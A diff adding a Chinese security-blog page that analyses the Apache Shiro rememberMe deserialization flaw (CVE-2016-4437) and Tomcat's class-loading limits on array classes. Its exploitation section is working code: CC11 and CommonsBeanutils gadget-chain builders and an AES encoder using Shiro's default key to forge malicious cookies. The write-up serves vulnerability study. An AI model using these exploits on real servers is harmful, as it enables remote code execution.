@@ -1,0 +1,745 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="博客">
+    <meta name="description" content="最难不过坚持">
+    <meta name="author" content="lazysugar">
+    
+    <title>
+        
+            从Tomcat类加载机制中真正理解shiro反序列化 |
+        
+        lazysugar&#39;s Blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+        <link rel="shortcut icon" href="/favicon-32x32.ico">
+    
+    
+<link rel="stylesheet" href="/font/css/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/regular.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/solid.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/brands.min.css">
+
+    
+    <script class="keep-theme-configurations">
+    const KEEP = window.KEEP || {}
+    KEEP.hexo_config = {"hostname":"1azy.icu","root":"/","language":"zh-CN","path":"search.xml"}
+    KEEP.theme_config = {"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true,"layout":"right"},"style":{"primary_color":"#0066cc","logo":"/favicon-32x32.ico","favicon":"/favicon-32x32.ico","avatar":"/favicon-32x32.ico","first_screen":{"enable":true,"background_img":"/images/bg.svg","description":"最难不过坚持.","hitokoto":true},"scroll":{"progress_bar":false,"percent":false}},"local_search":{"enable":true,"preload":false},"code_block":{"tools":{"enable":false,"style":"default"},"highlight_theme":"default"},"pjax":{"enable":false},"lazyload":{"enable":false},"comment":{"enable":false,"use":"valine","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.21"},"waline":{"server_url":null,"reaction":false,"version":2},"giscus":{"repo":null,"repo_id":null,"category":"Announcements","category_id":null,"reactions_enabled":false}},"post":{"author_label":{"enable":false,"auto":false,"custom_label_list":["Trainee","Engineer","Architect"]},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":true,"share":false,"reward":{"enable":false,"img_link":null,"text":null}},"website_count":{"busuanzi_count":{"enable":false,"site_uv":false,"site_pv":false,"page_pv":false}},"version":"3.8.5"}
+    KEEP.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"}
+    KEEP.language_code_block = {"copy":"复制代码","copied":"已复制","fold":"折叠代码块","folded":"已折叠"}
+    KEEP.language_copy_copyright = {"copy":"复制版权信息","copied":"已复制","title":"原文标题","author":"原文作者","link":"原文链接"}
+  </script>
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+</div>
+
+
+<main class="page-container border-box">
+
+    <!-- home first screen  -->
+    
+
+    <!-- page content -->
+    <div class="page-main-content border-box">
+        <div class="page-main-content-top">
+            
+<header class="header-wrapper">
+
+    <div class="border-box header-content">
+        <div class="left border-box">
+            
+                <a class="logo-image border-box" href="/">
+                    <img src="/favicon-32x32.ico">
+                </a>
+            
+            <a class="site-name border-box" href="/">
+               lazysugar&#39;s Blog
+            </a>
+        </div>
+
+        <div class="right border-box">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/"
+                            >
+                                首页
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/archives"
+                            >
+                                归档
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/tags"
+                            >
+                                标签
+                            </a>
+                        </li>
+                    
+                        <li class="menu-item">
+                            <a class=""
+                               href="/categories"
+                            >
+                                分类
+                            </a>
+                        </li>
+                    
+                    
+                        <li class="menu-item search search-popup-trigger">
+                            <i class="fas fa-search"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/">首页</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives">归档</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/tags">标签</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/categories">分类</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle border-box">
+
+            <div class="main-content border-box">
+
+                
+
+                    <div class="fade-in-down-animation">
+    <div class="post-page-container border-box">
+
+        <div class="article-content-container border-box">
+
+            
+
+            <div class="article-content-bottom border-box">
+                
+                    <div class="article-title">
+                        从Tomcat类加载机制中真正理解shiro反序列化
+                    </div>
+                
+
+                
+                    <div class="article-header border-box">
+                        
+                            <div class="avatar-box border-box">
+                                <img src="/favicon-32x32.ico">
+                            </div>
+                        
+                        <div class="info-box">
+                            <div class="author">
+                                <span class="name">lazysugar</span>
+                                
+                            </div>
+                            <div class="meta-info border-box">
+                                
+
+<div class="article-meta-info-container border-box post">
+    <div class="article-meta-info border-box">
+        
+
+
+        
+            <span class="meta-info-item article-create-date">
+                <i class="icon fa-solid fa-calendar-check"></i>&nbsp;
+                <span class="pc">2023-07-15 03:16:12</span>
+                <span class="mobile">2023-07-15 03:16</span>
+            </span>
+
+            <span class="meta-info-item article-update-date">
+                <i class="icon fa-solid fa-file-pen"></i>&nbsp;
+                <span class="pc" data-updated="Wed Oct 25 2023 18:39:04 GMT+0800">2023-10-25 18:39:04</span>
+            </span>
+        
+
+        
+            <span class="meta-info-item article-category border-box"><i class="icon fas fa-folder"></i>&nbsp;
+                <ul class="article-category-ul">
+                    
+                            <li class="category-item"><a href="/categories/java%E5%AE%89%E5%85%A8/">java安全</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+            <span class="article-tag meta-info-item border-box">
+                <i class="icon fas fa-tags"></i>&nbsp;
+                <ul class="article-tag-ul">
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/java%E5%AE%89%E5%85%A8/">java安全</a></li>
+                        
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">shiro反序列化</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+        
+            <span class="meta-info-item article-wordcount">
+                <i class="icon fas fa-file-word"></i>&nbsp;<span>1.7k 字</span>
+            </span>
+        
+        
+            <span class="meta-info-item article-min2read">
+                <i class="icon fas fa-clock"></i>&nbsp;<span>7 分钟</span>
+            </span>
+        
+        
+    </div>
+
+    
+</div>
+
+                            </div>
+                        </div>
+                    </div>
+                
+
+                <div class="article-content keep-markdown-body">
+                    
+
+                    <h1 id="shiro反序列化漏洞"><a href="#shiro反序列化漏洞" class="headerlink" title="shiro反序列化漏洞"></a>shiro反序列化漏洞</h1><table>
+<thead>
+<tr>
+<th>CVE编号</th>
+<th>漏洞说明</th>
+<th>漏洞版本</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>CVE-2016-4437&#x2F;SHIRO-550</td>
+<td>当没有为“remember me”功能配置密钥时，允许远程攻击者执行任意代码或通过请求参数绕过预期的访问限制。</td>
+<td>Apache Shiro &lt;&#x3D; 1.2.4</td>
+</tr>
+<tr>
+<td>CVE-2019-12422&#x2F;SHIRO-721</td>
+<td>当使用默认的 “rememberMe “配置时，cookies可能容易受到Padding Oracle Attack 填充攻击。</td>
+<td>Apache Shiro &lt; 1.4.2</td>
+</tr>
+</tbody></table>
+<h1 id="CVE-2016-4437-x2F-SHIRO-550"><a href="#CVE-2016-4437-x2F-SHIRO-550" class="headerlink" title="CVE-2016-4437&#x2F;SHIRO-550"></a>CVE-2016-4437&#x2F;SHIRO-550</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>clone一下别的师傅的项目：<a class="link"   target="_blank" rel="noopener" href="https://github.com/phith0n/JavaThings/tree/master/shirodemo" >https://github.com/phith0n/JavaThings/tree/master/shirodemo<i class="fas fa-external-link-alt"></i></a></p>
+<h2 id="以发现者的角度分析漏洞"><a href="#以发现者的角度分析漏洞" class="headerlink" title="以发现者的角度分析漏洞"></a>以发现者的角度分析漏洞</h2><p>首先在这个1day漏洞爆出来的时候，我们会从漏洞描述中知道这是个关于cookie的漏洞，这时候，我们就需要去找找看shiro中关于管理cookie的类，有个<code>CookieRememberMeManager</code>，进去看看。</p>
+<p><img src="/images/20231009143719.png"></p>
+<p>其中有两个方法：<br><code>rememberSerializedIdentity()</code>设置cookie</p>
+<p><img src="/images/20231009144501.png"></p>
+<p><code>getRememberedSerializedIdentity()</code>获取cookie</p>
+<p><img src="/images/20231009144553.png"></p>
+<p>我们先来看<code>getRememberedSerializedIdentity()</code>，先判断是否是ShiroHttpServletRequest，然后调用<code>cookie.readValue()</code>获取cookie中的值，进去看看具体是获取哪个值</p>
+<p><img src="/images/20231009150150.png"></p>
+<p>将name传入，获取的是key为name的值，而name是在构造函数中传入的，这时要追溯到创建<code>SimpleCookie</code>的时候，<code>SimpleCookie</code>是在设置cookie的时候创建的，具体就不追了很简单</p>
+<p><img src="/images/20231009150512.png"></p>
+<p>调用了参数名为name的有参构造，将rememberMe字符串作为参数传了进去，所以<code>cookie.readValue()</code>获取的是cookie中的<code>rememberMe</code>的值，之后就对这个base64值解码并返回。</p>
+<p>我们看看哪里调用了这个方法，发现<code>AbstractRememberMeManager#getRememberedPrincipals</code>调用了它</p>
+<p><img src="/images/20231009144840.png"></p>
+<p><code>getRememberedPrincipals</code>方法中首先调用<code>getRememberedSerializedIdentity</code>方法从cookie中返回<code>rememberMe</code>解码后的byte数组，传入<code>convertBytesToPrincipals</code>方法中</p>
+<p><img src="/images/20231009145143.png"></p>
+<p>调用了<code>decrypt</code>解密，<code>deserialize</code>反序列化</p>
+<p><img src="/images/20231009151315.png"></p>
+<p>看看<code>decrypt</code>方法的逻辑，先获取密钥服务，传入要加密的数组和密钥进行加密，重点关注一下这个密钥</p>
+<p><img src="/images/20231009151636.png"></p>
+<p>经过一些列的调用会发现获取到的值在构造方法中设置的一个常量</p>
+<p><img src="/images/20231009151859.png"><br>调用栈如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">org.apache.shiro.mgt.AbstractRememberMeManager#AbstractRememberMeManager</span><br><span class="line">org.apache.shiro.mgt.AbstractRememberMeManager#setCipherKey</span><br><span class="line">org.apache.shiro.mgt.AbstractRememberMeManager#setDecryptionCipherKey</span><br></pre></td></tr></table></figure>
+
+<p>AES解密后调用<code>deserialize</code>反序列化，其中序列化器是<code>DefaultSerializer</code>，导致反序列化漏洞存在</p>
+<p><img src="/images/20231009152547.png"><br><img src="/images/20231009152710.png"></p>
+<p>解密的逻辑追完后我们来看看加密的逻辑，看看哪个方法调用了<code>rememberSerializedIdentity()</code></p>
+<p><img src="/images/20231009144728.png"></p>
+<p>其中调用了<code>convertPrincipalsToBytes</code>获取AES加密后的数据，之后调用<code>rememberSerializedIdentity()</code>base64后设置进cookie，跟进看看</p>
+<p><img src="/images/20231009153000.png"></p>
+<p>调用<code>serialize</code>序列化数据，调用<code>encrypt</code>AES加密数据，解密过程正好相反</p>
+<p><img src="/images/20231009153018.png"></p>
+<p>总结一下：</p>
+<p>加密：序列化-AES-base64<br>解密：base64-AES-反序列化</p>
+<h2 id="无法反序列化Transformer-探讨"><a href="#无法反序列化Transformer-探讨" class="headerlink" title="无法反序列化Transformer[]探讨"></a>无法反序列化Transformer[]探讨</h2><blockquote>
+<p>具体可以看我完整分析Tomcat类加载器的文章</p>
+</blockquote>
+<p>在制作exp的时候发现有个问题：<code>无法反序列化Transformer[]</code></p>
+<p>直接看源码：</p>
+<p>shiro在反序列化的时候用的是自定义的<code>ObjectInputStream</code></p>
+<p><img src="/images/20231014015331.png"></p>
+<p>这个<code>ClassResolvingObjectInputStream</code>重写了<code>resolveClass</code>，我们在<code>深入java反序列化</code>文章中分析过<code>readObject</code>的源码，重写<code>resolveClass</code>可以自定义要获取的Class对象</p>
+<p><img src="/images/20231014015443.png"></p>
+<p>这里使用<code>ClassUtils.forName</code>来获取class对象目的就是让Tomcat的<code>WebAppClassLoader</code>去加载反序列化的类</p>
+<p><img src="/images/20231014020123.png"></p>
+<p>来到<code>WebappClassLoaderBase#loadClass(java.lang.String, boolean)</code>，首先调用<code>findLoadedClass0</code>,先从缓存中获取有无加载过的class</p>
+<p><img src="/images/image.png" alt="Alt text"><br><img src="/images/image-1.png" alt="Alt text"></p>
+<p>判断有无开启双亲委派机制，有的话会先委派父加载器去加载</p>
+<p><img src="/images/image-2.png" alt="Alt text"></p>
+<p>使用WebApp类加载器去加载，其逻辑是扫描”WEB-INF&#x2F;libs”和”WEB-INF&#x2F;classes”目录下jar包中有无对应name的class类，有的话就返回，具体扫描的逻辑是用<code>jarFile</code>类实现的，有兴趣的师傅可以去跟下。</p>
+<p><img src="/images/image-3.png" alt="Alt text"></p>
+<p>这时我们的<code>[Lorg.apache.commons.collections.Transformer;</code>这个类名是肯定扫描不到的，而<code>org.apache.commons.collections.Transformer</code>类名是可以扫描到的</p>
+<p><img src="/images/image-4.png" alt="Alt text"></p>
+<p><img src="/images/image-9.png" alt="Alt text"></p>
+<p>后面判断没有开启双亲委派的话，会用<code>commonloader</code>去加载类，也就是<code>$CATALINE_HOME/lib</code>目录下的。</p>
+<p><img src="/images/image-5.png" alt="Alt text"></p>
+<p><code>[Lorg.apache.commons.collections.Transformer;</code>肯定是加载不到的，而<code>[Ljava.lang.StackTraceElement;</code>就可以加载到</p>
+<p><img src="/images/image-7.png" alt="Alt text"></p>
+<p><img src="/images/image-6.png" alt="Alt text"></p>
+<p>最后所有加载器都加载不到的话，就抛出<code>ClassNotFoundException</code>的异常</p>
+<p><img src="/images/image-8.png" alt="Alt text"></p>
+<p>所以网上很多说加载不了数组的结论是错的，准确来说<strong>可以加载共享库中的对象数组但不能加载自定义类和第三方类的对象数组</strong></p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>既然是反序列化那就要配合依赖去打，这里用CC链但有以下条件：</p>
+<ol>
+<li>无法使用<code>Transformer[]</code></li>
+<li>4版本以下不能用<code>TransformingComparator</code>(因为3版本的没有实现<code>Serializable</code>)</li>
+</ol>
+<p>附上其他师傅的链：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">// 改进版 CC11 EXP</span><br><span class="line">public class CC11BestEXP &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception&#123;</span><br><span class="line">        byte[] code = Files.readAllBytes(Paths.get(&quot;ClassForCC2.class&quot;));</span><br><span class="line">        byte[][] codes = &#123;code&#125;;</span><br><span class="line">        TemplatesImpl templates = new TemplatesImpl();</span><br><span class="line">        setFieldValue(templates, &quot;_name&quot;, &quot;aaaaa&quot;);</span><br><span class="line">        setFieldValue(templates, &quot;_bytecodes&quot;, codes);</span><br><span class="line">        setFieldValue(templates, &quot;_tfactory&quot;, new TransformerFactoryImpl());</span><br><span class="line">        InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;newTransformer&quot;, null, null);</span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;();</span><br><span class="line">        Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(hashMap, new ConstantTransformer(1)); // 防止在反序列化前弹计算器</span><br><span class="line">        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, templates);</span><br><span class="line">        HashMap&lt;Object, Object&gt; expMap = new HashMap&lt;&gt;();</span><br><span class="line">        expMap.put(tiedMapEntry, &quot;value&quot;);</span><br><span class="line">        lazyMap.remove(templates);</span><br><span class="line">        // 在 put 之后通过反射修改值</span><br><span class="line">        setFieldValue(lazyMap, &quot;factory&quot;, invokerTransformer);</span><br><span class="line">        </span><br><span class="line">        serialize(expMap);</span><br><span class="line">        //    unserialize(&quot;ser.bin&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception&#123;</span><br><span class="line">        Field field = obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(true);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void serialize(Object obj) throws IOException &#123;</span><br><span class="line">        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException&#123;</span><br><span class="line">        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));</span><br><span class="line">        Object obj = ois.readObject();</span><br><span class="line">        return obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>CB链：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">public class CB1EXP &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception&#123;</span><br><span class="line">        byte[] code = Files.readAllBytes(Paths.get(&quot;ClassForCC2.class&quot;));</span><br><span class="line">        TemplatesImpl templates = new TemplatesImpl();</span><br><span class="line">        setFieldValue(templates, &quot;_name&quot;, &quot;Calc&quot;);</span><br><span class="line">        setFieldValue(templates, &quot;_bytecodes&quot;, new byte[][] &#123;code&#125;);</span><br><span class="line">        setFieldValue(templates, &quot;_tfactory&quot;, new TransformerFactoryImpl());</span><br><span class="line">        //    templates.newTransformer();</span><br><span class="line">        final BeanComparator beanComparator = new BeanComparator();</span><br><span class="line">        // 创建新的队列，并添加恶意字节码</span><br><span class="line">        final PriorityQueue&lt;Object&gt; queue = new PriorityQueue&lt;Object&gt;(2, beanComparator);</span><br><span class="line">        queue.add(&quot;1&quot;);</span><br><span class="line">        queue.add(&quot;1&quot;);</span><br><span class="line"></span><br><span class="line">        // 将 property 的值赋为 outputProperties</span><br><span class="line">        setFieldValue(beanComparator, &quot;property&quot;, &quot;outputProperties&quot;);</span><br><span class="line">        setFieldValue(queue, &quot;queue&quot;, new Object[]&#123;templates, templates&#125;);</span><br><span class="line">        serialize(queue);</span><br><span class="line">        //    unserialize(&quot;ser.bin&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception&#123;</span><br><span class="line">        Field field = obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(true);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static void serialize(Object obj) throws IOException &#123;</span><br><span class="line">        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException&#123;</span><br><span class="line">        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));</span><br><span class="line">        Object obj = ois.readObject();</span><br><span class="line">        return obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>AES加密工具：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">public class AESEncode &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">//        String path = &quot;./ser.bin&quot;;</span><br><span class="line">//        String path = &quot;./CC6WithHashMap.bin&quot;;</span><br><span class="line">//        String path = &quot;./stackTest.bin&quot;;</span><br><span class="line">        String path = &quot;./tranTest.bin&quot;;</span><br><span class="line">        byte[] key = Base64.decode(&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;);</span><br><span class="line">        AesCipherService aes = new AesCipherService();</span><br><span class="line">        ByteSource ciphertext = aes.encrypt(getBytes(path), key);</span><br><span class="line">        System.out.printf(ciphertext.toString());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    public static byte[] getBytes(String path) throws Exception&#123;</span><br><span class="line">        InputStream inputStream = new FileInputStream(path);</span><br><span class="line">        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();</span><br><span class="line">        int n = 0;</span><br><span class="line">        while ((n=inputStream.read())!=-1)&#123;</span><br><span class="line">            byteArrayOutputStream.write(n);</span><br><span class="line">        &#125;</span><br><span class="line">        byte[] bytes = byteArrayOutputStream.toByteArray();</span><br><span class="line">        return bytes;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+                </div>
+
+                
+                        
+<div class="article-copyright-info-container border-box">
+    <div class="copyright-info-content border-box">
+        <div class="copyright-info-top border-box">
+            <div class="post-title border-box text-ellipsis">
+                从Tomcat类加载机制中真正理解shiro反序列化
+            </div>
+
+            <div class="post-link border-box text-ellipsis">
+                2023/07/15/shiro反序列化/
+            </div>
+        </div>
+
+        <div class="copyright-info-bottom border-box">
+            <div class="post-author bottom-item">
+                <div class="type">
+                    作者
+                </div>
+                <div class="content">lazysugar</div>
+            </div>
+
+            <div class="post-time bottom-item">
+                <div class="type">
+                    发布于
+                </div>
+                <div class="content">2023-07-15 03:16</div>
+            </div>
+
+
+            <div class="post-license bottom-item">
+                <div class="type">
+                    许可
+                </div>
+                <div class="content tooltip" data-tooltip-content="CC BY-NC-SA 4.0">
+                    <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh-hans">
+                        <i class="fa-brands fa-creative-commons"></i>
+                        <i class="fa-brands fa-creative-commons-by"></i>
+                        <i class="fa-brands fa-creative-commons-nc"></i>
+                        <i class="fa-brands fa-creative-commons-sa"></i>
+                    </a>
+                </div>
+            </div>
+        </div>
+
+        <i class="copyright-bg fa-solid fa-copyright"></i>
+    </div>
+    <div class="copy-copyright-info flex-center tooltip" data-tooltip-content="复制版权信息" data-tooltip-offset-y="-2px">
+        <i class="fa-solid fa-copy"></i>
+    </div>
+</div>
+
+                
+
+                <div class="post-bottom-tags-and-share border-box">
+                    <div>
+                        
+                            <ul class="post-tags-box border-box">
+                                
+                                    <li class="tag-item border-box">
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/java%E5%AE%89%E5%85%A8/">java安全</a>
+                                    </li>
+                                
+                                    <li class="tag-item border-box">
+                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">shiro反序列化</a>
+                                    </li>
+                                
+                            </ul>
+                        
+                    </div>
+                    <div>
+                        
+                    </div>
+                </div>
+
+                
+
+                
+                    <div class="article-nav">
+                        
+                            <div class="article-prev">
+                                <a class="prev"
+                                   rel="prev"
+                                   href="/2023/07/15/Spring%20Controller%E5%86%85%E5%AD%98%E9%A9%AC/"
+                                   title="Spring Controller内存马"
+                                >
+                                    <span class="left arrow-icon flex-center">
+                                      <i class="fas fa-chevron-left"></i>
+                                    </span>
+                                            <span class="title flex-center">
+                                        <span class="post-nav-title-item text-ellipsis">Spring Controller内存马</span>
+                                        <span class="post-nav-item">上一篇</span>
+                                    </span>
+                                </a>
+                            </div>
+                        
+                        
+                            <div class="article-next">
+                                <a class="next"
+                                   rel="next"
+                                   href="/2023/07/15/Tomcat%E7%B1%BB%E5%8A%A0%E8%BD%BD%E5%99%A8/"
+                                   title="Tomcat类加载器"
+                                >
+                                    <span class="title flex-center">
+                                        <span class="post-nav-title-item text-ellipsis">Tomcat类加载器</span>
+                                        <span class="post-nav-item">下一篇</span>
+                                    </span>
+                                            <span class="right arrow-icon flex-center">
+                                      <i class="fas fa-chevron-right"></i>
+                                    </span>
+                                </a>
+                            </div>
+                        
+                    </div>
+                
+
+                
+                    
+
+
+
+
+
+
+                
+            </div>
+        </div>
+
+        
+            <div class="pc-post-toc right-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="nav-text">shiro反序列化漏洞</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#CVE-2016-4437-x2F-SHIRO-550"><span class="nav-text">CVE-2016-4437&#x2F;SHIRO-550</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-text">环境搭建</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%A5%E5%8F%91%E7%8E%B0%E8%80%85%E7%9A%84%E8%A7%92%E5%BA%A6%E5%88%86%E6%9E%90%E6%BC%8F%E6%B4%9E"><span class="nav-text">以发现者的角度分析漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%97%A0%E6%B3%95%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Transformer-%E6%8E%A2%E8%AE%A8"><span class="nav-text">无法反序列化Transformer[]探讨</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="nav-text">漏洞利用</span></a></li></ol></li></ol>
+    </div>
+</div>
+
+            </div>
+        
+    </div>
+</div>
+
+
+                
+            </div>
+
+        </div>
+
+        <div class="page-main-content-bottom border-box">
+            
+<footer class="footer border-box">
+    <div class="border-box website-info-box default">
+        
+            <div class="copyright-info info-item default">
+                &copy;&nbsp;<span>2020</span>&nbsp;-&nbsp;2023
+                
+                    &nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;&nbsp;<a href="/">lazysugar</a>
+                
+            </div>
+
+            <div class="theme-info info-item default">
+                由&nbsp;<a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;驱动&nbsp;&&nbsp;主题&nbsp;<a class="keep-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep</a>
+            </div>
+
+            
+
+            
+                <div class="deploy-info info-item default">
+                    
+                        本站由 <span class="tooltip" data-tooltip-content="GitHub Pages"><img src="/images/deploy-provider/github.png"></span> 提供部署服务
+                        
+                </div>
+            
+        
+
+        <div class="count-item info-item default">
+            
+                <span class="count-box border-box word">
+                    <span class="item-type border-box">总字数</span>
+                    <span class="item-value border-box word">66.9k</span>
+                </span>
+            
+
+            
+
+            
+        </div>
+    </div>
+</footer>
+
+        </div>
+    </div>
+
+    <!-- post tools -->
+    
+        <div class="post-tools right-toc">
+            <div class="post-tools-container border-box">
+    <ul class="tools-list border-box">
+        <!-- PC TOC show toggle -->
+        
+            <li class="tools-item flex-center toggle-show-toc">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
